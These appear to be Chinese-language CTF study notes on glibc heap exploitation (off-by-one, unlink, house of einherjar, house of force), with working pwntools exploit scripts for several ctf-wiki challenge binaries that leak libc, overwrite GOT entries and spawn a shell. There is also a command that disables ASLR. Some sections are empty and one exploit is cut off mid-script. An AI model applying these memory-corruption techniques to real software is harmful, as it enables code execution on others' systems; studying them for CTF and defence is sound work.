---
title: heap利用
date: 2024-06-04 12:56:10
category: pwn
tags: heap
---

# off by one
严格来说 off-by-one 漏洞是一种特殊的溢出漏洞，off-by-one 指程序向缓冲区中写入时，写入的字节数超过了这个缓冲区本身所申请的字节数并且只越界了一个字节。

## 利用思路

### 溢出字节为可控制任意字节
通过修改大小造成块结构之间出现重叠，从而泄露其他块数据，或是覆盖其他块数据。也可使用 NULL 字节溢出的方法

### 溢出字节为 NULL 字节
在 size 为 0x100 的时候，溢出 NULL 字节可以使得 prev_in_use 位被清，这样前块会被认为是 free 块。
1. 这时可以选择使用 [unlink](#unlink) 方法进行处理。
2. 另外，这时 prev_size 域就会启用，就可以伪造 prev_size ，从而造成块之间发生重叠。

## 例题
### Asis_2016_b00ks
> 题目地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/off_by_one/Asis_2016_b00ks
> 题目版本：ubuntu16.04 & glibc-2.23

# chunk extend/shrink

# unlink
主要利用unlink宏，2.29后变成了一个名为unlink_chunk的函数，不过功能是一样的
下面是2.26版本的unlink，2.26之前没有size和prev_size的检测
```c
/* Take a chunk off a bin list */
#define unlink(AV, P, BK, FD) {                                            \
    if (__builtin_expect (chunksize(P) != prev_size (next_chunk(P)), 0))      \
      malloc_printerr (check_action, "corrupted size vs. prev_size", P, AV);  \
    FD = P->fd;								      \
    BK = P->bk;								      \
    if (__builtin_expect (FD->bk != P || BK->fd != P, 0))		      \
      malloc_printerr (check_action, "corrupted double-linked list", P, AV);  \
    else {								      \
        FD->bk = BK;							      \
        BK->fd = FD;							      \
        if (!in_smallbin_range (chunksize_nomask (P))			      \
            && __builtin_expect (P->fd_nextsize != NULL, 0)) {		      \
	    if (__builtin_expect (P->fd_nextsize->bk_nextsize != P, 0)	      \
		|| __builtin_expect (P->bk_nextsize->fd_nextsize != P, 0))    \
	      malloc_printerr (check_action,				      \
			       "corrupted double-linked list (not small)",    \
			       P, AV);					      \
            if (FD->fd_nextsize == NULL) {				      \
                if (P->fd_nextsize == P)				      \
                  FD->fd_nextsize = FD->bk_nextsize = FD;		      \
                else {							      \
                    FD->fd_nextsize = P->fd_nextsize;			      \
                    FD->bk_nextsize = P->bk_nextsize;			      \
                    P->fd_nextsize->bk_nextsize = FD;			      \
                    P->bk_nextsize->fd_nextsize = FD;			      \
                  }							      \
              } else {							      \
                P->fd_nextsize->bk_nextsize = P->bk_nextsize;		      \
                P->bk_nextsize->fd_nextsize = P->fd_nextsize;		      \
              }								      \
          }								      \
      }									      \
}
```
可以通过伪造一个fakechunk，然后想办法对fakechunk进行unlink操作(比如free中的前向合并、后向合并)
想要利用成功，需要绕过几个检测

需要在fakechunk处伪造fd、bk指针，具体有两种伪造方法
```c
//方法一：需要同时伪造两条链
fakechunk->fd(fakechunk+0x10) = fakechunk
fakechunk->bk(fakechunk+0x18) = fakechunk

//方法二：可以用于只伪造一条链的情况(比如伪造倒数第二个smallbin需要让fd指向倒数第一个smallbin)
fakechunk->fd(fakechunk+0x10) = &fakechunk-0x18
fakechunk->bk(fakechunk+0x18) = &fakechunk-0x10
// 这里的fakechunk为一个全局指针，需要利用这个指针所在的地址，如果没有这个指针，需要在一个地方放置fakechunk的地址
// 比如可以在prev_size的位置存放fakechunk地址，如下
fakechunk[0] = fakechunk
fakechunk->fd(fakechunk+0x10) = fakechunk-0x18
fakechunk->bk(fakechunk+0x18) = fakechunk-0x10
```
glibc-2.26以上还需要伪造size和next chunk
fakechunk = p64(fakechunk_addr) + p64(size) + p64(fd) + p64(bk) + b'a' * (size-0x20) + p64(size)

假设现在有个data或bss段的ptr指针，指向了一块内存区域，那么我们就可以在这块内存区域中伪造fakechunk(ptr=&fakechunk)
```python
fakechunk  = p64(0) # prev_size
fakechunk += p64(0x20) # size
fakechunk += p64(ptr-0x18) # fd
fakechunk += p64(ptr-0x10) # bk
fakechunk += p64(0x20) # nextchunk->prev_size 为了绕过unlink中第一个检测
```
之后想办法unlink这块内存，比如修改某个区块的prev_size和prev_inuse，使得free该chunk时需要和前一个chunk合并，通过prev_size，找到前一个chunk(即fakechunk)，然后进行unlink

此时ptr附近的内存布局为
|address     |before unlink value|after unlink value|
|------------|-------------------|------------------|
|ptr-0x18(FD)|???                |???               |
|ptr-0x10(BK)|???                |???               |
|ptr-0x8     |???                |???               |
|ptr         |fakechunk_addr     |ptr-0x18          |

也就是说我们通过unlink修改了ptr的值，一般来说ptr是存放申请堆块指针的数组，而我们能通过ptr来访问堆块，现在我们就可以通过ptr来访问ptr附近的地址，也就是说我们获取了控制堆指针的权限，可以随意修改堆指针指向，改变任意地址的值

## 例题
### 2014_hitcon_stkof
> 题目地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2014_hitcon_stkof
> 题目版本：ubuntu16.04 & glibc-2.23

#### 分析
```sh
➜  2014_hitcon_stkof checksec stkof    
[*] '/Pwn/heap/unlink/2014_hitcon_stkof/stkof'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```
edit函数可以无限溢出

#### IO缓冲区问题分析
值得注意的是，由于程序本身没有进行 setbuf 操作，所以在执行输入输出操作的时候会申请缓冲区。

alloc函数会先调用IO函数fgets，再执行malloc，最后执行printf
执行fgets会申请输入缓冲区，这里测试为大小为0x1000
再执行malloc函数，申请我们输入大小的chunk
再执行printf函数，会申请输出缓冲区，这里测试大小为0x400

所以第一次申请的堆块会被输入缓冲区和输出缓冲区夹在中间，很难利用
因此我们不用第一次申请的chunk溢出，第一次申请仅排除输入缓冲区和输出缓冲区的干扰

#### exp
```python
from pwn import *

p = process("./stkof")

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

elf = ELF('./stkof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

def alloc(size):
    p.sendline(b'1')
    p.sendline(str(size).encode())
    p.recvuntil(b'OK\n')

def edit(idx, size, content):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(str(size).encode())
    p.send(content)
    p.recvuntil(b'OK\n')

def free(idx):
    p.sendline(b'3')
    p.sendline(str(idx).encode())

head = 0x602140

alloc(0x100)#1
alloc(0x30)#2
alloc(0x80)#3

fakechunk  = p64(0) # prev_size
fakechunk += p64(0x20) # size
fakechunk += p64(head + 0x10 - 0x18) # fd
fakechunk += p64(head + 0x10 - 0x10) # bk
fakechunk += p64(0x20) # nextchunk->prev_size
fakechunk  = fakechunk.ljust(0x30,b'a') #pading
fakechunk += p64(0x30) # find fakechunk
fakechunk += p64(0x90) # remove prev_inuse

edit(2,len(fakechunk),fakechunk)
free(3)
p.recvuntil(b'OK\n')

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
free_got = elf.got['free']
atoi_got = elf.got['atoi']

edit(2,0x28,b'a'*0x8 + p64(head) + p64(free_got) + p64(puts_got)+ p64(atoi_got))
edit(1,0x8,p64(puts_plt))
free(2)
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak - 0x06f6a0
log.success('libc_base ==>> ' + hex(libc_base))

system = libc_base + libc.sym['system']

edit(3,0x8,p64(system))
p.sendline('/bin/sh')

p.interactive()
```

### 2016_zctf_note2
> 题目地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2016_zctf_note2
> 题目版本：ubuntu16.04 & glibc-2.23

#### 分析
```sh
➜  2016_zctf_note2 checksec note2
[*] '/Pwn/heap/unlink/2016_zctf_note2/note2'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

edit函数虽然可以无限溢出，但是溢出使用的是strcpy，无法覆盖成'\0'
不过alloc函数在输入size为0时会触发无符号整数溢出，可以无限输入，可以利用这个函数溢出

#### 思路
1. 申请一个用于伪造fakechunk，触发unlink的chunk
2. 申请一个size为0，用于溢出的chunk
3. 申请一个用于覆盖prev_inuse和prev_size，free后找fakechunk合并的chunk
4. free掉第二个chunk，重新申请回来用于溢出
5. free掉第三个chunk，触发unlink
6. 此时我们已将ptr处的指针改为ptr-0x18，利用edit函数修改ptr为atoi_got(这里只能修改一个，因为edit函数遇到'\0'会截断)
7. show泄露atoi_got，进而泄露libc_base
8. 修改atoi_got为system函数地址，再输入'/bin/sh\x00'即可获取shell

#### exp
```python
from pwn import *

p = process('./note2')

note2 = ELF('./note2')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

def alloc(length, content):
    p.recvuntil(b'option--->>')
    p.sendline(b'1')
    p.recvuntil(b'(less than 128)')
    p.sendline(str(length).encode())
    p.recvuntil(b'content:')
    p.sendline(content)

def show(id):
    p.recvuntil(b'option--->>')
    p.sendline(b'2')
    p.recvuntil(b'note:')
    p.sendline(str(id))

def edit(id, choice, s):
    p.recvuntil(b'option--->>')
    p.sendline(b'3')
    p.recvuntil(b'note:')
    p.sendline(str(id).encode())
    p.recvuntil(b'2.append]')
    p.sendline(str(choice).encode())
    p.sendline(s)

def delete(id):
    p.recvuntil(b'option--->>')
    p.sendline(b'4')
    p.recvuntil(b'note:')
    p.sendline(str(id).encode())

p.recvuntil(b'name:')
p.sendline(b'hello')
p.recvuntil(b'address:')
p.sendline(b'hello')

ptr = 0x602120

fakechunk  = p64(0)
fakechunk += p64(0x40)
fakechunk += p64(ptr-0x18)
fakechunk += p64(ptr-0x10)
fakechunk += b'a'*0x20
fakechunk += p64(0x40)

alloc(0x50,fakechunk) # 0
alloc(0,b'aaaa') # 1
alloc(0x80,b'bbbb') # 2
delete(1)
alloc(0,b'a'*0x10 + p64(0x70) + p64(0x90)) # 1
delete(2)

free_got = note2.got['free']
puts_plt = note2.plt['puts']
puts_got = note2.got['puts']
atoi_got = note2.got['atoi']

edit(0,1,b'a'*0x18+p64(atoi_got))
show(0)

p.recvuntil(b'Content is ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc_base = leak-0x036e90
log.success('libc_base ==>> ' + hex(libc_base))

system = libc_base + libc.sym['system']
edit(0,1,p64(system))
p.recvuntil(b'option--->>')
p.sendline(b'/bin/sh\x00')

p.interactive()
```

### 2017_insomni'hack_wheelofrobots
> 题目地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/unlink/2017_insomni%27hack_wheelofrobots
> 题目版本：ubuntu16.04 & glibc-2.23

#### 关于signal函数
一个小知识，对做题没有影响
```c
void（* signal（int sig，void（* func）（int）））（int）;
```
1. 分析
这个函数接受两个参数：第一个为int型;第二个为指向一个返回值为void，接受一个int参数的函数指针
这个函数返回值不是void，而是一个指向一个返回值为void，接受一个int参数的函数指针

2. sig -- 在信号处理程序中作为变量使用的信号码。sig宏在signal.h文件中定义，也可以用命令`kill -l`列出所有sig信号
```c
/* ISO C99 signals.  */
#define	SIGINT		2	/* Interactive attention signal.  */
#define	SIGILL		4	/* Illegal instruction.  */
#define	SIGABRT		6	/* Abnormal termination.  */
#define	SIGFPE		8	/* Erroneous arithmetic operation.  */
#define	SIGSEGV		11	/* Invalid access to storage.  */
#define	SIGTERM		15	/* Termination request.  */

/* Historical signals specified by POSIX. */
#define	SIGHUP		1	/* Hangup.  */
#define	SIGQUIT		3	/* Quit.  */
#define	SIGTRAP		5	/* Trace/breakpoint trap.  */
#define	SIGKILL		9	/* Killed.  */
#define SIGBUS		10	/* Bus error.  */
#define	SIGSYS		12	/* Bad system call.  */
#define	SIGPIPE		13	/* Broken pipe.  */
#define	SIGALRM		14	/* Alarm clock.  */

/* New(er) POSIX signals (1003.1-2008, 1003.1-2013).  */
#define	SIGURG		16	/* Urgent data is available at a socket.  */
#define	SIGSTOP		17	/* Stop, unblockable.  */
#define	SIGTSTP		18	/* Keyboard stop.  */
#define	SIGCONT		19	/* Continue.  */
#define	SIGCHLD		20	/* Child terminated or stopped.  */
#define	SIGTTIN		21	/* Background read from control terminal.  */
#define	SIGTTOU		22	/* Background write to control terminal.  */
#define	SIGPOLL		23	/* Pollable event occurred (System V).  */
#define	SIGXCPU		24	/* CPU time limit exceeded.  */
#define	SIGXFSZ		25	/* File size limit exceeded.  */
#define	SIGVTALRM	26	/* Virtual timer expired.  */
#define	SIGPROF		27	/* Profiling timer expired.  */
#define	SIGUSR1		30	/* User-defined signal 1.  */
#define	SIGUSR2		31	/* User-defined signal 2.  */

/* Nonstandard signals found in all modern POSIX systems
   (including both BSD and Linux).  */
#define	SIGWINCH	28	/* Window size change (4.3 BSD, Sun).  */
```
下面详细介绍几个比较重要的：
|值 |宏       |信号                                                                                               |
|---|---------|--------------------------------------------------------------------------------------------------|
|6  |SIGABRT  |(Signal Abort) 程序异常终止。                                                                      |
|8  |SIGFPE   |(Signal Floating-Point Exception) 算术运算出错，如除数为 0 或溢出（不一定是浮点运算）。               |
|4  |SIGILL   |(Signal Illegal Instruction) 非法函数映象，如非法指令，通常是由于代码中的某个变体或者尝试执行数据导致的。|
|2  |SIGINT   |(Signal Interrupt) 中断信号，如 ctrl-C，通常由用户生成。                                             |
|11 |SIGSEGV  |(Signal Segmentation Violation) 非法访问存储器，如访问不存在的内存单元。                              |
|15 |SIGTERM  |(Signal Terminate) 发送给本程序的终止请求信号。                                                      |

3. func -- 一个指向函数的指针。它可以是一个由程序定义的函数，也可以是下面预定义函数之一：
|函数   |功能               |
|SIG_DFL|默认的信号处理程序。|
|SIG_IGN|忽视信号。         |

4. 返回值
SIG_ERR

#### 分析
```sh
➜  2017_insomni'hack_wheelofrobots checksec wheelofrobots
[*] "/Pwn/heap/unlink/2017_insomni'hack_wheelofrobots/wheelofrobots"
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
```

#### 思路


#### exp


# UAF

# fastbin attack

# unsortedbin attack

# largebin attack

# tcache attack

# house of einherjar
主要利用free函数的后向合并(合并低地址chunk)操作
```c
if (!prev_inuse(p)) {
  prevsize = p->prev_size;
  size += prevsize;
  p = chunk_at_offset(p, -((long) prevsize));
  unlink(av, p, bck, fwd);
}
```
修改某个chunk的prev_size(可以通过前一个chunk的溢出)，使得p指针指向 target-0x10=fakechunk
从而使得下一次申请可以获得target的读写权限

想要成功扩展，需要通过unlink的检测(见[unlink](#unlink))

## 例题
### 2016_seccon_tinypad
> 题目地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-einherjar/2016_seccon_tinypad
> 题目版本：ubuntu16.04 & glibc-2.23

#### 分析
删除函数有个UAF，虽然不能写，但是能读
程序使用的read函数有个off by null

#### 思路
1. 利用fastbin的fd指针泄露heap基址
2. 利用free堆块合并到top chunk会进行fastbin的合并从而泄露main_arena进而泄露libc基址
3. 利用house of einherjar将堆合并到tinypad+0x20的位置
4. 修改第一个第二个memo的content指针，泄露environ，进而泄露栈，同时将第二个content的指针指向第一个memo的content，方便修改指针。到这就可以实现任意地址读写了
5. 修改main的ret地址为one_gadget，退出即可获取shell

#### exp
```python
from pwn import *

p = process("./tinypad")
elf = ELF("./tinypad")
libc = ELF("./libc.so.6")

context.log_level = 'debug'
context.terminal = ['tmux','splitw','-h']

def add(size, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'a')
    p.recvuntil(b'(SIZE)>>> ')
    p.sendline(str(size).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)

def edit(idx, content):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'e')
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())
    p.recvuntil(b'(CONTENT)>>> ')
    p.sendline(content)
    p.recvuntil(b'Is it OK?\n')
    p.sendline(b'Y')

def delete(idx):
    p.recvuntil(b'(CMD)>>> ')
    p.sendline(b'd')
    p.recvuntil(b'(INDEX)>>> ')
    p.sendline(str(idx).encode())

# leak heap_base
add(0x70,b'a'*8) #1
add(0x70,b'b'*8) #2
add(0x100,b'c'*8) #3
delete(2)
delete(1) #1
p.recvuntil(b'CONTENT: ')
leak = u64(p.recv(4).ljust(8,b'\x00'))
heap_base = leak - 0x80
log.success("heap_base ==> " + hex(heap_base))

# leak libc_base
delete(3)
p.recvuntil(b'CONTENT: ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
main_arena = leak - 88
libc_base = leak - 0x3c4b78
log.success("main_arena ==> " + hex(main_arena))
log.success("libc_base ==> " + hex(libc_base))

# house of einherjar
add(0x18,b'a'*0x18) #1
add(0x100,b'b'*0xf8+b'\x11') #2
add(0x100,b'c'*0xf8) #3
add(0x100,b'd'*0xf8) #4

tinypad_addr = 0x602040 
fake_chunk_addr = tinypad_addr + 0x20 
fake_chunk_size = 0x101
fake_chunk = p64(0) + p64(fake_chunk_size) + p64(fake_chunk_addr) + p64(fake_chunk_addr)
edit(3,b'e'*0x20 + fake_chunk)

diff = heap_base + 0x20 - fake_chunk_addr
log.info("diff : " + hex(diff))

# padding with b'\x00'
prev_size_len = len(p64(diff).strip(b'\0'))
for i in range(8,prev_size_len-1,-1):
	edit(1,b'f'*0x10 + b'f'*i)
edit(1,b'f'*0x10 + p64(diff))
delete(2)

edit(4,b'd'*0x20+p64(0)+p64(0x101)+p64(main_arena+88)+p64(main_arena+88)) 

one_gadget = libc_base + 0xf1247 
environ_addr = libc_base + libc.sym['environ']

fake_pad = b'g'*(0x100-0x20-0x10) + b'a'*8 + p64(environ_addr) +b'a'*8 +  p64(0x602148)
add(0x100-8,fake_pad)

p.recvuntil(b'CONTENT: ')
leak = u64(p.recv(6).ljust(8,b'\x00'))
environ = leak
log.success('environ ==> ' + hex(environ))
main_ret_addr = environ - 240

edit(2,p64(main_ret_addr))
edit(1,p64(one_gadget))

p.recvuntil(b'(CMD)>>> ')
p.sendline(b'q')
 
p.interactive()
```

# house of force
该方法已在glibc-2.29失效，在use top处加了如下代码
```c
victim = av->top;
size = chunksize (victim);

if (__glibc_unlikely (size > av->system_mem))
  malloc_printerr ("malloc(): corrupted top size");
```

注意，测试时关闭了ASLR，这样就不用泄露heap基址了
- 0 没有地址空间随机化
- 1 部分地址空间随机化，将mmap基址，栈基址和.so文件基址随机化
- 2 完全地址空间随机化，在1的基础上加上heap基址，这是默认选项 

`echo 0 > /proc/sys/kernel/randomize_va_space`
重启后恢复为2

## 扩展top chunk到低地址
1. 利用溢出修改top chunk的size为-1
2. 提高top chunk指针
本程序测出malloc_got为0x601028，申请完a后top_chunk地址为0x602020
将malloc_got对齐为0x601020，使最后一位为0，为使top_chunk提高为0x601010，从而使下次申请chunk可以分配到malloc_got
需要满足申请的size经过 request2size 后为 0x601010-0x602020=-4112
输入 -4120 即可
3. 申请chunk，即可修改malloc_got

```c
#include<stdio.h>
#include<malloc.h>
#include<stdlib.h>
#include<unistd.h>

void hack()
{
    execve("/bin/sh",0,0);
}

int main()
{
    size_t * a,*b;
    a =(size_t *)malloc(0x10);
    a[3] = -1;
    malloc(-4120);
    b = (size_t *) malloc(0x10);

    b[1] = &hack;
    malloc(0x10);

    return 0;
}
```

## 扩展top chunk到高地址
1. 利用溢出修改top chunk的size为-1
2. 申请chunk，将top_chunk指针置位__malloc_hook-0x10
__malloc_hook地址为0x7ffff7dd1b10，申请完a后top_chunk地址为0x602020
需要使top指针降低 __mallco_hook - 0x10 - 0x602020 = 0x7FFFF77CFAE0
则需要申请 0x7FFFF77CFAD0 大小的堆块
3. 申请chunk，修改__malloc_hook

```c
#include<stdio.h>
#include<malloc.h>
#include<stdlib.h>
#include<unistd.h>

void hack()
{
    execve("/bin/sh",0,0);
}

int main()
{
    size_t * a,*b;
    a =(size_t *)malloc(0x10);
    a[3] = -1;
    malloc(0x7FFFF77CFAD0);
    b = (size_t *) malloc(0x10);

    b[0] = &hack;
    malloc(0x10);

    return 0;
}
```

## 例题
### hitcontraning_lab11
> 题目地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/hitcontraning_lab11
> 题目版本：ubuntu16.04 & glibc-2.23

#### 分析
```sh
➜  hitcontraning_lab11 checksec bamboobox    
[*] '/Pwn/heap/house-of-force/hitcontraning_lab11/bamboobox'
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

change_item函数有堆溢出漏洞

#### 思路
1. 修改top chunk的size为-1
2. 降低top chunk的指针到heap基址
3. 申请chunk获取存放函数指针的堆块的读写权限
4. 修改goodbye函数指针内容为magic函数地址
5. 利用退出选项执行magic函数

#### exp
```python

    p.sendline(str(length).encode())
    p.recvuntil(b":")
    p.sendline(name)

def modify(idx, length, name):
    p.recvuntil(b":")
    p.sendline(b"3")
    p.recvuntil(b":")
    p.sendline(str(idx).encode())
    p.recvuntil(b":")
    p.sendline(str(length).encode())
    p.recvuntil(b":")
    p.sendline(name)

def remove(idx):
    p.recvuntil(b":")
    p.sendline(b"4")
    p.recvuntil(b":")
    p.sendline(str(idx).encode())

def show():
    p.recvuntil(b":")
    p.sendline(b"1")

magic = 0x400D49

additem(0x20,b'aaaa')
modify(0,0x30,b'a'*0x28+struct.pack("<qx",-1))
additem(-88,b'bbbb')
additem(0x10,p64(magic)*2)
p.recvuntil(b':')
p.sendline(b'5')

p.interactive()
```

### 2016_bctf_bcloud
> 题目地址：https://github.com/ctf-wiki/ctf-challenges/tree/master/pwn/heap/house-of-force/2016_bctf_bcloud
> 题目版本：ubuntu16.04 & glibc-2.23

#### 分析
```sh
➜  2016_bctf_bcloud checksec bcloud
[*] '/Pwn/heap/house-of-force/2016_bctf_bcloud/bcloud'
    Arch:       i386-32-little
    RELRO:      Partial RELRO
    Stack:      Canary found
    NX:         NX enabled
    PIE:        No PIE (0x8048000)
```

init_name函数strcpy有漏洞，当输入64个字符后，strcpy就会顺便将tmp的值也拷贝至堆块中，也就泄露了堆基址
```c
unsigned int init_name()
{
  char s[64]; // [esp+1Ch] [ebp-5Ch] BYREF
  char *tmp; // [esp+5Ch] [ebp-1Ch]
  unsigned int v3; // [esp+6Ch] [ebp-Ch]

  v3 = __readgsdword(0x14u);
  memset(s, 0, 0x50u);
  puts("Input your name:");
  read_str(s, 64, '\n');
  tmp = (char *)malloc(64u);
  name = tmp;
  strcpy(tmp, s);
  info(tmp);
  return __readgsdword(0x14u) ^ v3;
}
```

init_org_host函数中的strcpy也有漏洞，若输入Org时输入64个字符，在strcpy时就会将v3开头4个字符复制到top chunk的size部分，从而实现扩大top chunk
```c
unsigned int init_org_host()
{
  char s[64]; // [esp+1Ch] [ebp-9Ch] BYREF
  char *v2; // [esp+5Ch] [ebp-5Ch]
  char v3[68]; // [esp+60h] [ebp-58h] BYREF
  char *v4; // [esp+A4h] [ebp-14h]
  unsigned int v5; // [esp+ACh] [ebp-Ch]

  v5 = __readgsdword(0x14u);
  memset(s, 0, 144u);
  puts("Org:");
  read_str(s, 64, '\n');
  puts("Host:");
  read_str(v3, 64, '\n');
  v4 = (char *)malloc(64u);
  v2 = (char *)malloc(64u);
  org = v2;
  host = v4;
  strcpy(v4, v3);
  strcpy(v2, s);
  puts("OKay! Enjoy:)");
  return __readgsdword(0x14u) ^ v5;
}
```

#### 思路
1. 利用init的两个漏洞泄露heap_base、修改top chunk的size
2. 将堆分配到notelist-0x10处
3. 修改free_got为puts_plt泄露puts_got，进而泄露libc_base
4. 修改atoi_got为system函数地址
5. 执行atoi(b'/bin/sh\x00')即可获取shell

这里尝试过修改__malloc_hook为one_gadget，不过失败了

#### exp
```python
from pwn import *

p = process("./bcloud")

context.terminal = ['tmux', 'splitw', '-h']
context.log_level = 'debug'

elf = ELF("./bcloud")
libc = ELF('/lib32/libc.so.6')

def create(size,content):
        p.recvuntil(b'option--->>\n')
        p.sendline(b'1')
        p.recvuntil(b'Input the length of the note content:\n')
        p.sendline(str(size).encode())
        p.recvuntil(b'Input the content:\n')
        p.sendline(content)

def edit(idx,content):
        p.recvuntil(b'option--->>\n')
        p.sendline(b'3')
        p.recvuntil(b'id:\n')
        p.sendline(str(idx).encode())
        p.recvuntil(b'content:\n')
        p.sendline(content)

def delete(idx):
        p.recvuntil(b'option--->>\n')
        p.sendline(b'4')
        p.recvuntil(b'id:\n')
        p.sendline(str(idx).encode())

p.recvuntil(b'name:\n')
p.send(b'a'*60 + b'b'*4)
p.recvuntil(b'bbbb')
leak = u32(p.recv(4))
heap_base = leak - 8
log.success('heap_base ==>> ' + hex(heap_base))

p.recvuntil(b'Org:\n')
p.send(b'a'*60 + b'c'*4)
p.recvuntil(b'Host:\n')
p.send(b'\xff'*4 + b'a'*60)

notelist_addr = 0x0804B120
notechunk = 0x0804b110
offset = notelist_addr - 0x10 - (heap_base+0xd8) - 0x10
create(offset,b'dddd')#0
create(0x40,b'eeee')#1
create(0x40,b'ffff')#2
create(0x40,b'ffff')#3

puts_plt = elf.plt['puts']
puts_got = elf.got['puts']
free_got = elf.got['free'] 
atoi_got = elf.got['atoi']

edit(1,b'f'*0x14 + p32(notechunk) + p32(free_got))
edit(2,p32(puts_plt))
edit(1,b'f'*0x14 + p32(notechunk) + p32(puts_got))
delete(2)
leak = u32(p.recv(4))
puts_addr = leak
log.success('puts_addr ==>> ' + hex(puts_addr))
libc_base = puts_addr - libc.sym['puts']
log.success('libc_base ==>> ' + hex(libc_base))
system = libc_base + libc.sym['system']

edit(1,b'f'*0x14 + p32(notechunk) + p32(0) + p32(atoi_got))
edit(3,p32(system))

p.recvuntil(b'option--->>\n')
p.sendline(b'/bin/sh\x00')

p.interactive()
```

# house of lore
House of Lore 攻击与 Glibc 堆管理中的 Small Bin 的机制紧密相关。

